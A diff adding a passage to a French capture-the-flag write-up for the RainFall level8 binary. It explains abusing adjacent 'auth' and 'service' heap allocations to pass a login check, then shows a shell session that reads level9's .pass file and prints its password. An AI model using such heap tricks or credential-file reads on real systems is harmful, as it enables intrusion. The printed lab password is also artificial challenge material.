@@ -51,3 +51,23 @@ service a
 Maintenant malheuresement l'etape que tu redoutes arrive :).
 Finit de trouver des bugs dans du source code, il va falloir lire de la doc et traduire en C le code :)
 VOus retrouverez le pseudo code en C dans le fichier source
+
+Bon grosso modo c'est une boucle inf dans lequel ya des strcmp ;) l'idee va etre de les faire peter.
+On s'est rendu compte precedemment que auth et service etaient tres proche dans la memoire.
+Si on arrive à les faire se toucher alors le login ne trouvera pas NULL et donc win :)
+
+```
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+service!@#$%^&*(*^%$#$%^&*(
+0x804a008, 0x804a018
+login
+$ ls
+ls: cannot open directory .: Permission denied
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
